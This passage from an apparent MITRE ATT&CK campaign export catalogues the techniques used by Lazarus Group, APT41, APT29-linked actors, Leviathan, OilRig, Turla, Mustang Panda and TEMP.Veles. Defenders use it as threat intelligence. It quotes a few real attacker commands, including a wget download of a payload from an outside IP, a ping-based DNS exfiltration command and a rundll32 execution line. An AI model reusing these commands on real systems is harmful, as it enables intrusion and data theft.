Victim Identity Information For Operation Dream Job, Lazarus Group conducted extensive reconnaissance research on potential targets.[1] Enterprise T1591 Gather Victim Org Information For Operation Dream Job, Lazarus Group gathered victim organization information to identify specific targets.[1] .004 Identify Roles During Operation Dream Job, Lazarus Group targeted specific individuals within an organization with tailored job vacancy announcements.[1][3] Enterprise T1656 Impersonation During Operation Dream Job, Lazarus Group impersonated HR hiring personnel through LinkedIn messages and conducted interviews with victims in order to deceive them into downloading malware.[1][3][4] Enterprise T1070 .004 Indicator Removal: File Deletion During Operation Dream Job, Lazarus Group removed all previously delivered files from a compromised computer.[3] Enterprise T1105 Ingress Tool Transfer During Operation Dream Job, Lazarus Group downloaded multistage malware and tools onto a compromised host.[1][3][2] Enterprise T1534 Internal Spearphishing During Operation Dream Job, Lazarus Group conducted internal spearphishing from within a compromised organization.[1] Enterprise T1036 .008 Masquerading: Masquerade File Type During Operation Dream Job, Lazarus Group disguised malicious template files as JPEG files to avoid detection.[2][3] Enterprise T1106 Native API During Operation Dream Job, Lazarus Group used Windows API ObtainUserAgentString to obtain the victim's User-Agent and used the value to connect to their C2 server.[2] Enterprise T1027 .002 Obfuscated Files or Information: Software Packing During Operation Dream Job, Lazarus Group packed malicious .db files with Themida to evade detection.[1][2][5] .013 Obfuscated Files or Information: Encrypted/Encoded File During Operation Dream Job, Lazarus Group encrypted malware such as DRATzarus with XOR and DLL files with base64.[1][3][2][5] Enterprise T1588 .002 Obtain Capabilities: Tool For Operation Dream Job, Lazarus Group obtained tools such as Wake-On-Lan, Responder, ChromePass, and dbxcli.[1][3] .003 Obtain Capabilities: Code Signing Certificates During Operation Dream Job, Lazarus Group used code signing certificates issued by Sectigo RSA for some of its malware and tools.[3] Enterprise T1566 .001 Phishing: Spearphishing Attachment During Operation Dream Job, Lazarus Group sent emails with malicious attachments to gain unauthorized access to targets' computers.[1][2] .002 Phishing: Spearphishing Link During Operation Dream Job, Lazarus Group sent malicious OneDrive links with fictitious job offer advertisements via email.[1][3] .003 Phishing: Spearphishing via Service During Operation Dream Job, Lazarus Group sent victims spearphishing messages via LinkedIn concerning fictitious jobs.[1][3] Enterprise T1053 .005 Scheduled Task/Job: Scheduled Task During Operation Dream Job, Lazarus Group created scheduled tasks to set a periodic execution of a remote XSL script.[3] Enterprise T1593 .001 Search Open Websites/Domains: Social Media For Operation Dream Job, Lazarus Group used LinkedIn to identify and target employees within a chosen organization.[3] Enterprise T1505 .004 Server Software Component: IIS Components During Operation Dream Job, Lazarus Group targeted Windows servers running Internet Information Systems (IIS) to install C2 components.[2] Enterprise T1608 .001 Stage Capabilities: Upload Malware For Operation Dream Job, Lazarus Group used compromised servers to host malware.[1][3][2][5] .002 Stage Capabilities: Upload Tool For Operation Dream Job, Lazarus Group used multiple servers to host malicious tools.[3] Enterprise T1553 .002 Subvert Trust Controls: Code Signing During Operation Dream Job, Lazarus Group digitally signed their own malware to evade detection.[3] Enterprise T1218 .010 System Binary Proxy Execution: Regsvr32 During Operation Dream Job, Lazarus Group used regsvr32 to execute malware.[3] .011 System Binary Proxy Execution: Rundll32 During Operation Dream Job, Lazarus Group executed malware with C:\\\\windows\\system32\\rundll32.exe \"C:\\ProgramData\\ThumbNail\\thumbnail.db\", CtrlPanel S-6-81-3811-75432205-060098-6872 0 0 905.[1][3][2] Enterprise T1614 .001 System Location Discovery: System Language Discovery During Operation Dream Job, Lazarus Group deployed malware designed not to run on computers set to Korean, Japanese, or Chinese in Windows language preferences.[1] Enterprise T1221 Template Injection During Operation Dream Job, Lazarus Group used DOCX files to retrieve a malicious document template/DOTM file.[1][2] Enterprise T1204 .001 User Execution: Malicious Link During Operation Dream Job, Lazarus Group lured users into executing a malicious link to disclose private account information or provide initial access.[1][3] .002 User Execution: Malicious File During Operation Dream Job, Lazarus Group lured victims into executing malicious documents that contained \"dream job\" descriptions from defense, aerospace, and other sectors.[1][2] Enterprise T1497 .001 Virtualization/Sandbox Evasion: System Checks During Operation Dream Job, Lazarus Group used tools that conducted a variety of system checks to detect sandboxes or VMware services.[1] .003 Virtualization/Sandbox Evasion: Time Based Evasion During Operation Dream Job, Lazarus Group used tools that collected GetTickCount and GetSystemTimeAsFileTime data to detect sandbox or VMware services.[1] Enterprise T1047 Windows Management Instrumentation During Operation Dream Job, Lazarus Group used WMIC to executed a remote XSL script.[3] Enterprise T1220 XSL Script Processing During Operation Dream Job, Lazarus Group used a remote XSL script to download a Base64-encoded DLL custom downloader.[3] Software ID Name Description S0694 DRATzarus During Operation Dream Job, Lazarus Group used DRATzarus to deploy open source software and partly commodity software such as Responder, Wake-On-Lan, and ChromePass to target infected hosts.[1] S0174 Responder [1] S0678 Torisma During Operation Dream Job, Lazarus Group used Torisma to actively monitor for new drives and remote desktop connections on an infected system.[2][5] References ClearSky Research Team. (2020, August 13). Operation 'Dream Job' Widespread North Korean Espionage Campaign. Retrieved December 20, 2021. Cashman, M. (2020, July 29). Operation North Star Campaign. Retrieved December 20, 2021. Breitenbacher, D and Osis, K. (2020, June 17). OPERATION IN(TER)CEPTION: Targeted Attacks Against European Aerospace and Military Companies. Retrieved December 20, 2021. Lakshmanan, R. (2022, August 17). North Korea Hackers Spotted Targeting Job Seekers with macOS Malware. Retrieved April 10, 2023. Beek, C. (2020, November 5). Operation North Star: Behind The Scenes. Retrieved December 20, 2021. "
},
{
"id": 436,
"title": "C0017, Campaign C0017",
"path": "/campaigns/C0017/index.html",
"content": " C0017 C0017 was an APT41 campaign conducted between May 2021 and February 2022 that successfully compromised at least six U.S. state government networks through the exploitation of vulnerable Internet facing web applications. During C0017, APT41 was quick to adapt and use publicly-disclosed as well as zero-day vulnerabilities for initial access, and in at least two cases re-compromised victims following remediation efforts. The goals of C0017 are unknown, however APT41 was observed exfiltrating Personal Identifiable Information (PII).[1] ID: C0017 First Seen: May 2021 [1] Last Seen: February 2022 [1] Contributors: Kyaw Pyiyt Htet, @KyawPyiytHtet Version: 1.0 Created: 01 December 2022 Last Modified: 16 April 2025 Version Permalink Live Version Groups ID Name Description G0096 APT41 [1] Techniques Used Domain ID Name Use Enterprise T1134 Access Token Manipulation During C0017, APT41 used a ConfuserEx obfuscated BADPOTATO exploit to abuse named-pipe impersonation for local NT AUTHORITY\\SYSTEM privilege escalation.[1] Enterprise T1071 .001 Application Layer Protocol: Web Protocols During C0017, APT41 ran wget http://103.224.80[.]44:8080/kernel to download malicious payloads.[1] Enterprise T1560 .003 Archive Collected Data: Archive via Custom Method During C0017, APT41 hex-encoded PII data prior to exfiltration.[1] Enterprise T1059 .003 Command and Scripting Interpreter: Windows Command Shell During C0017, APT41 used cmd.exe to execute reconnaissance commands.[1] .007 Command and Scripting Interpreter: JavaScript During C0017, APT41 deployed JScript web shells on compromised systems.[1] Enterprise T1005 Data from Local System During C0017, APT41 collected information related to compromised machines as well as Personal Identifiable Information (PII) from victim networks.[1] Enterprise T1001 .003 Data Obfuscation: Protocol or Service Impersonation During C0017, APT41 frequently configured the URL endpoints of their stealthy passive backdoor LOWKEY.PASSIVE to masquerade as normal web application traffic on an infected server.[1] Enterprise T1074 .001 Data Staged: Local Data Staging During C0017, APT41 copied the local SAM and SYSTEM Registry hives to a staging directory.[1] Enterprise T1140 Deobfuscate/Decode Files or Information During C0017, APT41 used the DUSTPAN loader to decrypt embedded payloads.[1] Enterprise T1048 .003 Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol During C0017, APT41 exfiltrated victim data via DNS lookups by encoding and prepending it as subdomains to the attacker-controlled domain.[1] Enterprise T1041 Exfiltration Over C2 Channel During C0017, APT41 used its Cloudflare services C2 channels for data exfiltration.[1] Enterprise T1567 Exfiltration Over Web Service During C0017, APT41 used Cloudflare services for data exfiltration.[1] Enterprise T1190 Exploit Public-Facing Application During C0017, APT41 exploited CVE-2021-44207 in the USAHerds application and CVE-2021-44228 in Log4j, as well as other .NET deserialization, SQL injection, and directory traversal vulnerabilities to gain initial access.[1] Enterprise T1574 Hijack Execution Flow During C0017, APT41 established persistence by loading malicious libraries via modifications to the Import Address Table (IAT) within legitimate Microsoft binaries.[1] Enterprise T1105 Ingress Tool Transfer During C0017, APT41 downloaded malicious payloads onto compromised systems.[1] Enterprise T1036 .004 Masquerading: Masquerade Task or Service During C0017, APT41 used SCHTASKS /Change to modify legitimate scheduled tasks to run malicious code.[1] .005 Masquerading: Match Legitimate Resource Name or Location During C0017, APT41 used file names beginning with USERS, SYSUSER, and SYSLOG for DEADEYE, and changed KEYPLUG file extensions from .vmp to .upx likely to avoid hunting detections.[1] Enterprise T1027 Obfuscated Files or Information During C0017, APT41 broke malicious binaries, including DEADEYE and KEYPLUG, into multiple sections on disk to evade detection.[1] .002 Software Packing During C0017, APT41 used VMProtect to slow the reverse engineering of malicious binaries.[1] Enterprise T1588 .002 Obtain Capabilities: Tool For C0017, APT41 obtained publicly available tools such as YSoSerial.NET, ConfuserEx, and BadPotato.[1] Enterprise T1003 .002 OS Credential Dumping: Security Account Manager During C0017, APT41 copied the SAM and SYSTEM Registry hives for credential harvesting.[1] Enterprise T1090 Proxy During C0017, APT41 used the Cloudflare CDN to proxy C2 traffic.[1] Enterprise T1053 .005 Scheduled Task/Job: Scheduled Task During C0017, APT41 used the following Windows scheduled tasks for DEADEYE dropper persistence on US state government networks: \\Microsoft\\Windows\\PLA\\Server Manager Performance Monitor, \\Microsoft\\Windows\\Ras\\ManagerMobility, \\Microsoft\\Windows\\WDI\\SrvSetupResults, and \\Microsoft\\Windows\\WDI\\USOShared.[1] Enterprise T1505 .003 Server Software Component: Web Shell During C0017, APT41 deployed JScript web shells through the creation of malicious ViewState objects.[1] Enterprise T1082 System Information Discovery During C0017, APT41 issued ping -n 1 ((cmd /c dir c:\\|findstr Number).split()[-1]+ commands to find the volume serial number of compromised systems.[1] Enterprise T1016 System Network Configuration Discovery During C0017, APT41 used cmd.exe /c ping %userdomain% for discovery.[1] Enterprise T1033 System Owner/User Discovery During C0017, APT41 used whoami to gather information from victim machines.[1] Enterprise T1102 Web Service During C0017, APT41 used the Cloudflare services for C2 communications.[1] .001 Dead Drop Resolver During C0017, APT41 used dead drop resolvers on two separate tech community forums for their KEYPLUG Windows-version backdoor; notably APT41 updated the community forum posts frequently with new dead drop resolvers during the campaign.[1] Software ID Name Description S0154 Cobalt Strike During C0017, APT41 used the DUSTPAN in-memory dropper to drop a Cobalt Strike BEACON backdoor onto a compromised network.[1] S1052 DEADEYE [1] S0105 dsquery During C0017, APT41 used multiple dsquery commands to enumerate various Active Directory objects within a compromised environment.[1] S1051 KEYPLUG [1] S0002 Mimikatz During C0017, APT41 used Mimikatz to execute the lsadump::sam command on dumped registry hives to obtain locally stored credentials and NTLM hashes.[1] S0097 Ping During C0017, APT41 issued Ping commands to trigger DNS resolutions for data exfiltration, where the output of a reconnaissance command was prepended to subdomains within APT41's Cloudflare C2 infrastructure.[1] References Rufus Brown, Van Ta, Douglas Bienstock, Geoff Ackerman, John Wolfram. (2022, March 8). Does This Look Infected? A Summary of APT41 Targeting U.S. State Governments. Retrieved July 8, 2022. "
},
{
"id": 437,
"title": "C0021, Campaign C0021",
"path": "/campaigns/C0021/index.html",
"content": " C0021 C0021 was a spearphishing campaign conducted in November 2018 that targeted public sector institutions, non-governmental organizations (NGOs), educational institutions, and private-sector corporations in the oil and gas, chemical, and hospitality industries. The majority of targets were located in the US, particularly in and around Washington D.C., with other targets located in Europe, Hong Kong, India, and Canada. C0021's technical artifacts, tactics, techniques, and procedures (TTPs), and targeting overlap with previous suspected APT29 activity.[1][2] ID: C0021 First Seen: November 2018 [2][1] Last Seen: November 2018 [2][1] Version: 1.0 Created: 15 March 2023 Last Modified: 16 April 2025 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1583 .001 Acquire Infrastructure: Domains For C0021, the threat actors registered domains for use in C2.[2] Enterprise T1071 .001 Application Layer Protocol: Web Protocols During C0021, the threat actors used HTTP for some of their C2 communications.[2] Enterprise T1059 .001 Command and Scripting Interpreter: PowerShell During C0021, the threat actors used obfuscated PowerShell to extract an encoded payload from within an .LNK file.[2][1] Enterprise T1584 .001 Compromise Infrastructure: Domains For C0021, the threat actors used legitimate but compromised domains to host malicious payloads.[1] Enterprise T1140 Deobfuscate/Decode Files or Information During C0021, the threat actors deobfuscated encoded PowerShell commands including use of the specific string 'FromBase'+0x40+'String', in place of FromBase64String which is normally used to decode base64.[2][1] Enterprise T1573 .002 Encrypted Channel: Asymmetric Cryptography During C0021, the threat actors used SSL via TCP port 443 for C2 communications.[2] Enterprise T1105 Ingress Tool Transfer During C0021, the threat actors downloaded additional tools and files onto victim machines.[1][2] Enterprise T1095 Non-Application Layer Protocol During C0021, the threat actors used TCP for some C2 communications.[2] Enterprise T1027 .009 Obfuscated Files or Information: Embedded Payloads For C0021, the threat actors embedded a base64-encoded payload within a LNK file.[1] .010 Obfuscated Files or Information: Command Obfuscation During C0021, the threat actors used encoded PowerShell commands.[2][1] Enterprise T1588 .002 Obtain Capabilities: Tool For C0021, the threat actors used Cobalt Strike configured with a modified variation of the publicly available Pandora Malleable C2 Profile.[2][1] Enterprise T1566 .002 Phishing: Spearphishing Link During C0021, the threat actors sent phishing emails with unique malicious links, likely for tracking victim clicks.[2][1] Enterprise T1608 .001 Stage Capabilities: Upload Malware For C0021, the threat actors uploaded malware to websites under their control.[2][1] Enterprise T1218 .011 System Binary Proxy Execution: Rundll32 During C0021, the threat actors used rundll32.exe to execute the Cobalt Strike Beacon loader DLL.[2] Enterprise T1204 .001 User Execution: Malicious Link During C0021, the threat actors lured users into clicking a malicious link which led to the download of a ZIP archive containing a malicious .LNK file.[2] Software ID Name Description S0154 Cobalt Strike [2][1] References Microsoft Defender Research Team. (2018, December 3). Analysis of cyberattack on U.S. think tanks, non-profits, public sector by unidentified attackers. Retrieved April 15, 2019. Dunwoody, M., et al. (2018, November 19). Not So Cozy: An Uncomfortable Examination of a Suspected APT29 Phishing Campaign. Retrieved November 27, 2018. "
},
{
"id": 438,
"title": "Leviathan Australian Intrusions, Campaign C0049",
"path": "/campaigns/C0049/index.html",
"content": " Leviathan Australian Intrusions Leviathan Australian Intrusions consisted of at least two long-term intrusions against victims in Australia by Leviathan, relying on similar tradecraft such as external service exploitation followed by extensive credential capture and re-use to enable privilege escalation and lateral movement. Leviathan Australian Intrusions were focused on exfiltrating sensitive data including valid credentials for the victim organizations.[1] ID: C0049 First Seen: April 2022 [1] Last Seen: September 2022 [1] Version: 1.0 Created: 03 February 2025 Last Modified: 14 March 2025 Version Permalink Live Version Groups ID Name Description G0065 Leviathan Leviathan Australian Intrusions was conducted by the Leviathan threat actor.[1] Techniques Used Domain ID Name Use Enterprise T1213 Data from Information Repositories Leviathan gathered information from SQL servers and Building Management System (BMS) servers during Leviathan Australian Intrusions.[1] Enterprise T1074 .001 Data Staged: Local Data Staging Leviathan stored captured credential material on local log files on victim systems during Leviathan Australian Intrusions.[1] Enterprise T1482 Domain Trust Discovery Leviathan performed Active Directory enumeration of victim environments during Leviathan Australian Intrusions.[1] Enterprise T1041 Exfiltration Over C2 Channel Leviathan exfiltrated collected data over existing command and control channels during Leviathan Australian Intrusions.[1] Enterprise T1190 Exploit Public-Facing Application Leviathan exploited public-facing web applications and appliances for initial access during Leviathan Australian Intrusions.[1] Enterprise T1212 Exploitation for Credential Access Leviathan exploited vulnerable network appliances during Leviathan Australian Intrusions, leading to the collection and exfiltration of valid credentials.[1] Enterprise T1068 Exploitation for Privilege Escalation Leviathan exploited software vulnerabilities in victim environments to escalate privileges during Leviathan Australian Intrusions.[1] Enterprise T1615 Group Policy Discovery Leviathan performed extensive Active Directory enumeration of victim environments during Leviathan Australian Intrusions.[1] Enterprise T1562 .004 Impair Defenses: Disable or Modify System Firewall Leviathan modified system firewalls to add two open listening ports on 9998 and 9999 during Leviathan Australian Intrusions.[1] Enterprise T1056 Input Capture Leviathan captured submitted multfactor authentication codes and other technical artifacts related to remote access sessions during Leviathan Australian Intrusions.[1] Enterprise T1111 Multi-Factor Authentication Interception Leviathan abused compromised appliance access to collect multifactor authentication token values during Leviathan Australian Intrusions.[1] Enterprise T1135 Network Share Discovery Leviathan scanned and enumerated remote network shares in victim environments during Leviathan Australian Intrusions.[1] Enterprise T1588 .006 Obtain Capabilities: Vulnerabilities Leviathan weaponized publicly-known vulnerabilities for initial access and other purposes during Leviathan Australian Intrusions.[1] Enterprise T1021 .002 Remote Services: SMB/Windows Admin Shares Leviathan used remote shares to move laterally through victim networks during Leviathan Australian Intrusions.[1] .004 Remote Services: SSH Leviathan used SSH brute force techniques to move laterally within victim environments during Leviathan Australian Intrusions.[1] Enterprise T1018 Remote System Discovery Leviathan performed extensive remote host enumeration to build their own map of victim networks during Leviathan Australian Intrusions.[1] Enterprise T1594 Search Victim-Owned Websites Leviathan enumerated compromised web application resources to identify additional endpoints and resources linkd to the website for follow-on access during Leviathan Australian Intrusions.[1] Enterprise T1505 .003 Server Software Component: Web Shell Leviathan relied extensively on web shell use following initial access for persistence and command execution purposes in victim environments during Leviathan Australian Intrusions.[1] Enterprise T1528 Steal Application Access Token Leviathan abused access to compromised appliances to collect JSON Web Tokens (JWTs), used for creating virtual desktop sessions, during Leviathan Australian Intrusions.[1] Enterprise T1558 .003 Steal or Forge Kerberos Tickets: Kerberoasting Leviathan used Kerberoasting techniques during Leviathan Australian Intrusions.[1] Enterprise T1082 System Information Discovery Leviathan performed host enumeration and data gathering operations on victim machines during Leviathan Australian Intrusions.[1] Enterprise T1552 Unsecured Credentials Leviathan gathered credentials hardcoded in binaries located on victim devices during Leviathan Australian Intrusions.[1] .001 Credentials In Files Leviathan gathered credentials stored in files related to Building Management System (BMS) operations during Leviathan Australian Intrusions.[1] Enterprise T1078 Valid Accounts Leviathan used captured, valid account information to log into victim web applications and appliances during Leviathan Australian Intrusions.[1] .002 Domain Accounts Leviathan compromised domain credentials during Leviathan Australian Intrusions.[1] .003 Local Accounts Leviathan used captured local account information, such as service accounts, for actions during Leviathan Australian Intrusions.[1] References CISA et al. (2024, July 8). People\u2019s Republic of China (PRC) Ministry of State Security APT40 Tradecraft in Action. Retrieved February 3, 2025. "
},
{
"id": 439,
"title": "Juicy Mix, Campaign C0044",
"path": "/campaigns/C0044/index.html",
"content": " Juicy Mix Juicy Mix was a campaign conducted by OilRig throughout 2022 that targeted Israeli organizations with the Mango backdoor.[1] ID: C0044 First Seen: January 2022 [1] Last Seen: December 2022 [1] Version: 1.0 Created: 25 November 2024 Last Modified: 25 November 2024 Version Permalink Live Version Groups ID Name Description G0049 OilRig [1] Techniques Used Domain ID Name Use Enterprise T1071 .001 Application Layer Protocol: Web Protocols During Juicy Mix, OilRig used a VBS script to send POST requests to register installed malware with C2.[1] Enterprise T1217 Browser Information Discovery During Juicy Mix, OilRig used the CDumper (Chrome browser) and EDumper (Edge browser) data stealers to collect cookies, browsing history, and credentials.[1] Enterprise T1059 .001 Command and Scripting Interpreter: PowerShell During Juicy Mix, OilRig used a PowerShell script to steal credentials.[1] .005 Command and Scripting Interpreter: Visual Basic During Juicy Mix, OilRig used VBS droppers to deliver and establish persistence for the Mango backdoor.[1] Enterprise T1584 .004 Compromise Infrastructure: Server During Juicy Mix, OilRig compromised an Israeli job portal to use for a C2 server.[1] Enterprise T1555 .003 Credentials from Password Stores: Credentials from Web Browsers During Juicy Mix, OilRig used the CDumper (Chrome browser) and EDumper (Edge browser) to collect credentials.[1] .004 Credentials from Password Stores: Windows Credential Manager During Juicy Mix, OilRig used a Windows Credential Manager stealer for credential access.[1] Enterprise T1132 .001 Data Encoding: Standard Encoding During Juicy Mix, OilRig used a VBS script to send the Base64-encoded name of the compromised computer to C2.[1] Enterprise T1074 .001 Data Staged: Local Data Staging During Juicy Mix, OilRig used browser data and credential stealer tools to stage stolen files named Cupdate, Eupdate, and IUpdate in the %TEMP% directory.[1] Enterprise T1140 Deobfuscate/Decode Files or Information During Juicy Mix, OilRig used a script to concatenate and deobfuscate encoded strings in Mango.[1] Enterprise T1587 .001 Develop Capabilities: Malware For Juicy Mix, OilRig improved on Solar by developing the Mango backdoor.[1] Enterprise T1053 .005 Scheduled Task/Job: Scheduled Task During Juicy Mix, OilRig used VBS droppers to schedule tasks for persistence.[1] Enterprise T1518 Software Discovery During Juicy Mix, OilRig used browser data dumper tools to create a list of users with Google Chrome installed.[1] Enterprise T1082 System Information Discovery During Juicy Mix, OilRig used a script to send the name of the compromised host via HTTP POST to register it with C2.[1] Software ID Name Description S1169 Mango [1] References Hromcova, Z. and Burgher, A. (2023, September 21). OilRig\u2019s Outer Space and Juicy Mix: Same ol\u2019 rig, new drill pipes. Retrieved November 21, 2024. "
},
{
"id": 440,
"title": "C0026, Campaign C0026",
"path": "/campaigns/C0026/index.html",
"content": " C0026 C0026 was a campaign identified in September 2022 that included the selective distribution of KOPILUWAK and QUIETCANARY malware to previous ANDROMEDA malware victims in Ukraine through re-registered ANDROMEDA C2 domains. Several tools and tactics used during C0026 were consistent with historic Turla operations.[1] ID: C0026 First Seen: August 2022 [1] Last Seen: September 2022 [1] Contributors: Yoshihiro Kori, NEC Corporation; Manikantan Srinivasan, NEC Corporation India; Pooja Natarajan, NEC Corporation India Version: 1.0 Created: 15 May 2023 Last Modified: 29 September 2023 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1583 .001 Acquire Infrastructure: Domains For C0026, the threat actors re-registered expired C2 domains previously used for ANDROMEDA malware.[1] Enterprise T1560 .001 Archive Collected Data: Archive via Utility During C0026, the threat actors used WinRAR to collect documents on targeted systems. The threat actors appeared to only exfiltrate files created after January 1, 2021.[1] Enterprise T1005 Data from Local System During C0026, the threat actors collected documents from compromised hosts.[1] Enterprise T1030 Data Transfer Size Limits During C0026, the threat actors split encrypted archives containing stolen files and information into 3MB parts prior to exfiltration.[1] Enterprise T1568 Dynamic Resolution During C0026, the threat actors re-registered a ClouDNS dynamic DNS subdomain which was previously used by ANDROMEDA.[1] Enterprise T1105 Ingress Tool Transfer During C0026, the threat actors downloaded malicious payloads onto select compromised hosts.[1] Software ID Name Description S1074 ANDROMEDA During C0026, the threat actors re-registered expired ANDROMEDA domains to profile past victims for further targeting.[1] S0099 Arp [1] S1075 KOPILUWAK KOPILUWAK was used as a first-stage profiling utility for previous victims of ANDROMEDA during C0026.[1] S0039 Net [1] S0104 netstat [1] S1076 QUIETCANARY During C0026, the threat actors used QUIETCANARY to gather and exfiltrate data. [1] References Hawley, S. et al. (2023, February 2). Turla: A Galaxy of Opportunity. Retrieved May 15, 2023. "
},
{
"id": 441,
"title": "RedDelta Modified PlugX Infection Chain Operations, Campaign C0047",
"path": "/campaigns/C0047/index.html",
"content": " RedDelta Modified PlugX Infection Chain Operations RedDelta Modified PlugX Infection Chain Operations was executed by Mustang Panda from mid-2023 through the end of 2024 against multiple entities in East and Southeast Asia. RedDelta Modified PlugX Infection Chain Operations involved phishing to deliver malicious files or links to users prompting follow-on installer downloads to load PlugX on victim machines in a persistent state.[1] ID: C0047 First Seen: July 2023 [1] Last Seen: December 2024 [1] Version: 1.0 Created: 14 January 2025 Last Modified: 02 April 2025 Version Permalink Live Version Groups ID Name Description G0129 Mustang Panda RedDelta Modified PlugX Infection Chain Operations was an campaign linked to Mustang Panda operations.[1] Techniques Used Domain ID Name Use Enterprise T1583 .001 Acquire Infrastructure: Domains Mustang Panda registered adversary-controlled domains during RedDelta Modified PlugX Infection Chain Operations that were re-registrations of expired domains.[1] Enterprise T1071 .001 Application Layer Protocol: Web Protocols Mustang Panda used HTTP POST messages for command and control from PlugX installations during RedDelta Modified PlugX Infection Chain Operations.[1] Enterprise T1547 .001 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder Mustang Panda used Run registry keys with names such as OneNote Update to execute legitimate executables that would load through search-order hijacking malicious DLLS to ensure persistence during RedDelta Modified PlugX Infection Chain Operations.[1] Enterprise T1059 .001 Command and Scripting Interpreter: PowerShell Mustang Panda used LNK files to execute PowerShell commands leading to eventual PlugX installation during RedDelta Modified PlugX Infection Chain Operations.[1] Enterprise T1480 Execution Guardrails Mustang Panda included the use of Cloudflare geofencing mechanisms to limit payload download activity during RedDelta Modified PlugX Infection Chain Operations.[1] Enterprise T1203 Exploitation for Client Execution Mustang Panda used the GrimResource exploitation technique via specially crafted MSC files for arbitrary code execution during RedDelta Modified PlugX Infection Chain Operations.[1] Enterprise T1564 .001 Hide Artifacts: Hidden Files and Directories Mustang Panda stored encrypted payloads associated with PlugX installation in hidden directories during RedDelta Modified PlugX Infection Chain Operations.[1] Enterprise T1574 .001 Hijack Execution Flow: DLL Mustang Panda used DLL search order hijacking on vulnerable applications to install PlugX payloads during RedDelta Modified PlugX Infection Chain Operations.[1] Enterprise T1036 .004 Masquerading: Masquerade Task or Service Mustang Panda masqueraded Registry run keys as legitimate-looking service names such as OneNote Update during RedDelta Modified PlugX Infection Chain Operations.[1] Enterprise T1095 Non-Application Layer Protocol Mustang Panda communicated over TCP 5000 from adversary administrative servers to adversary command and control nodes during RedDelta Modified PlugX Infection Chain Operations.[1] Enterprise T1027 .013 Obfuscated Files or Information: Encrypted/Encoded File Mustang Panda stored installation payloads as encrypted files in hidden folders during RedDelta Modified PlugX Infection Chain Operations.[1] Enterprise T1588 .004 Obtain Capabilities: Digital Certificates Mustang Panda acquired Cloudflare Origin CA TLS certificates during RedDelta Modified PlugX Infection Chain Operations.[1] Enterprise T1566 .001 Phishing: Spearphishing Attachment Mustang Panda leveraged malicious attachments in spearphishing emails for initial access to victim environments in RedDelta Modified PlugX Infection Chain Operations.[1] .002 Phishing: Spearphishing Link Mustang Panda distributed malicious links in phishing emails leading to HTML files that would direct the victim to malicious MSC files if running Windows based on User Agent fingerprinting during RedDelta Modified PlugX Infection Chain Operations.[1] Enterprise T1090 Proxy Mustang Panda proxied communication through the Cloudflare CDN service during RedDelta Modified PlugX Infection Chain Operations.[1] Enterprise T1608 .001 Stage Capabilities: Upload Malware Mustang Panda staged malware on adversary-controlled domains and cloud storage instances during RedDelta Modified PlugX Infection Chain Operations.[1] Enterprise T1553 .002 Subvert Trust Controls: Code Signing Mustang Panda used legitimate, signed binaries such as inkform.exe or ExcelRepairToolboxLauncher.exe for follow-on execution of malicious DLLs through DLL search order hijacking in RedDelta Modified PlugX Infection Chain Operations.[1] Enterprise T1218 .007 System Binary Proxy Execution: Msiexec Mustang Panda initial payloads downloaded a Windows Installer MSI file that in turn dropped follow-on files leading to installation of PlugX during RedDelta Modified PlugX Infection Chain Operations.[1] .014 System Binary Proxy Execution: MMC Mustang Panda used Microsoft Management Console Snap-In Control files, or MSC files, executed via MMC to run follow-on PowerShell commands during RedDelta Modified PlugX Infection Chain Operations.[1] Enterprise T1082 System Information Discovery Mustang Panda captured victim operating system type via User Agent analysis during RedDelta Modified PlugX Infection Chain Operations.[1] Enterprise T1204 .001 User Execution: Malicious Link Mustang Panda distributed hyperlinks that would result in an MSC file running a PowerShell command to download and install a remotely-hosted MSI file during RedDelta Modified PlugX Infection Chain Operations.[1] .002 User Execution: Malicious File Mustang Panda distributed malicious LNK objects for user execution during RedDelta Modified PlugX Infection Chain Operations.[1] Software ID Name Description S0013 PlugX Mustang Panda activities during RedDelta Modified PlugX Infection Chain Operations largely focused on ways to install a variant of PlugX on victim machines.[1] S0596 ShadowPad Mustang Panda used similar installation techniques with DLL sideloading to install ShadowPad during RedDelta Modified PlugX Infection Chain Operations.[1] References Insikt Group. (2025, January 9). Chinese State-Sponsored RedDelta Targeted Taiwan, Mongolia, and Southeast Asia with Adapted PlugX Infection Chain. Retrieved January 14, 2025. "
},
{
"id": 442,
"title": "Triton Safety Instrumented System Attack, Campaign C0030",
"path": "/campaigns/C0030/index.html",
"content": " Triton Safety Instrumented System Attack Triton Safety Instrumented System Attack was a campaign employed by TEMP.Veles which leveraged the Triton malware framework against a petrochemical organization.[1] The malware and techniques used within this campaign targeted specific Triconex Safety Controllers within the environment.[2] The incident was eventually discovered due to a safety trip that occurred as a result of an issue in the malware.[3] ID: C0030 First Seen: June 2017 [1] Last Seen: August 2017 [1] Version: 1.0 Created: 25 March 2024 Last Modified: 17 November 2024 Version Permalink Live Version Groups ID Name Description G0088 TEMP.Veles [4][5] Techniques Used Domain ID Name Use Enterprise T1595 Active Scanning In the Triton Safety Instrumented System Attack, TEMP.Veles engaged in network reconnaissance against targets of interest.[4] Enterprise T1059 .001 Command and Scripting Interpreter: PowerShell In the Triton Safety Instrumented System Attack, TEMP.Veles used a publicly available PowerShell-based tool, WMImplant.[4] Enterprise T1587 .001 Develop Capabilities: Malware In the Triton Safety Instrumented System Attack, TEMP.Veles developed, prior to the attack, malware capabilities that would require access to specific and specialized hardware and software.[5] Enterprise T1573 Encrypted Channel In the Triton Safety Instrumented System Attack, TEMP.Veles used cryptcat binaries to encrypt their traffic.[4] Enterprise T1056 .003 Input Capture: Web Portal Capture In the Triton Safety Instrumented System Attack, TEMP.Veles captured credentials as they were being changed by redirecting text-based login codes to websites they controlled.[1] Enterprise T1036 .005 Masquerading: Match Legitimate Resource Name or Location In the Triton Safety Instrumented System Attack, TEMP.Veles renamed files to look like legitimate files, such as Windows update files or Schneider Electric application files. Enterprise T1027 .005 Obfuscated Files or Information: Indicator Removal from Tools In the Triton Safety Instrumented System Attack, TEMP.Veles modified files based on the open-source project cryptcat in an apparent attempt to decrease anti-virus detection rates.[4] Enterprise T1588 .002 Obtain Capabilities: Tool In the Triton Safety Instrumented System Attack, TEMP.Veles used tools such as Mimikatz and other open-source software.[4] Enterprise T1003 .001 OS Credential Dumping: LSASS Memory In the Triton Safety Instrumented System Attack, TEMP.Veles used Mimikatz.[2] Enterprise T1053 .005 Scheduled Task/Job: Scheduled Task In the Triton Safety Instrumented System Attack, TEMP.Veles installed scheduled tasks 